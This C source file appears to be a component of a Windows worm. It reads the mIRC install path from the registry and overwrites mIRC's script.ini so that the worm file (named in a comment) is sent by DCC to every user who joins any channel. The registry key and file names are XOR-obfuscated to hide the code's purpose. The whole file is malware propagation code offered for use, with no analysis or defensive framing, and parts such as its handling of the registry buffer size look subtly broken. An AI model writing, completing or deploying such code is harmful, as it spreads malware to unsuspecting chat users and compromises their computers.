#include "data_globals.h"
#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}


#include <windows.h>
#include <stdio.h>
#include <string.h>  // for strlen, strcat

void _FindmIRC(void)
{
    char mIrc[256];
    char mIrcPath[256];
    char mIrcFull[256] = {0};
    FILE *Script;

    // Obfuscate registry subkey with key 0x3E
    volatile char sz_reg[] = { 'S'^0x3E, 'o'^0x3E, 'f'^0x3E, 't'^0x3E, 'w'^0x3E, 'a'^0x3E, 'r'^0x3E, 'e'^0x3E, '\\'^0x3E, 'M'^0x3E, 'i'^0x3E, 'c'^0x3E, 'r'^0x3E, 'o'^0x3E, 's'^0x3E, 'o'^0x3E, 'f'^0x3E, 't'^0x3E, '\\'^0x3E, 'W'^0x3E, 'i'^0x3E, 'n'^0x3E, 'd'^0x3E, 'o'^0x3E, 'w'^0x3E, 's'^0x3E, '\\'^0x3E, 'C'^0x3E, 'u'^0x3E, 'r'^0x3E, 'r'^0x3E, 'e'^0x3E, 'n'^0x3E, 't'^0x3E, 'V'^0x3E, 'e'^0x3E, 'r'^0x3E, 's'^0x3E, 'i'^0x3E, 'o'^0x3E, 'n'^0x3E, '\\'^0x3E, 'U'^0x3E, 'n'^0x3E, 'i'^0x3E, 'n'^0x3E, 's'^0x3E, 't'^0x3E, 'a'^0x3E, 'l'^0x3E, 'l'^0x3E, '\\'^0x3E, 'm'^0x3E, 'I'^0x3E, 'r'^0x3E, 'c'^0x3E, 0x00^0x3E };
    xor_decrypt(sz_reg, sizeof(sz_reg), 0x3E);
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, (char*)sz_reg, 0, KEY_READ, &_hKey);

    // Obfuscate "UninstallString" with key 0x7A
    volatile char sz_val[] = { 'U'^0x7A, 'n'^0x7A, 'i'^0x7A, 'n'^0x7A, 's'^0x7A, 't'^0x7A, 'a'^0x7A, 'l'^0x7A, 'l'^0x7A, 'S'^0x7A, 't'^0x7A, 'r'^0x7A, 'i'^0x7A, 'n'^0x7A, 'g'^0x7A, 0x00^0x7A };
    xor_decrypt(sz_val, sizeof(sz_val), 0x7A);
    RegQueryValueExA(_hKey, (char*)sz_val, NULL, NULL, mIrc, (LPDWORD)&_mIrcPath);
    RegCloseKey(_hKey);

    // Extract the mIRC installation path from the uninstall string (skip the first character)
    int e = 1;
    while (mIrc[e] != '\0' && mIrc[e] != '.')
    {
        mIrcFull[e - 1] = mIrc[e];
        e++;
    }
    mIrcFull[e - 1] = '\0';   // truncate before the dot (e.g., "C:\...\mirc.exe" -> "C:\...\mirc")

    // Find the last backslash and truncate to the directory
    e = strlen(mIrcFull);
    while (mIrcFull[e] != '\\')
    {
        mIrcFull[e] = '\0';
        e--;
    }

    // Obfuscate "script.ini" with key 0x1F
    volatile char sz_file[] = { 's'^0x1F, 'c'^0x1F, 'r'^0x1F, 'i'^0x1F, 'p'^0x1F, 't'^0x1F, '.'^0x1F, 'i'^0x1F, 'n'^0x1F, 'i'^0x1F, 0x00^0x1F };
    xor_decrypt(sz_file, sizeof(sz_file), 0x1F);
    strcat(mIrcFull, (char*)sz_file);

    Script = fopen(mIrcFull, "wt");
    fprintf(Script, "[script]\n");
    fprintf(Script, "n0=on 1:JOIN:#:{\n");
    fprintf(Script, "n1=/if ( $nick == $me ) { halt }\n");
    fprintf(Script, "n2=/dcc send $nick %s\n", _sysdoze2);   // use the global sysdoze2 (the worm's path)
    fprintf(Script, "n3=}\n");
    fclose(Script);

    return;
}
#pragma optimize("", on)
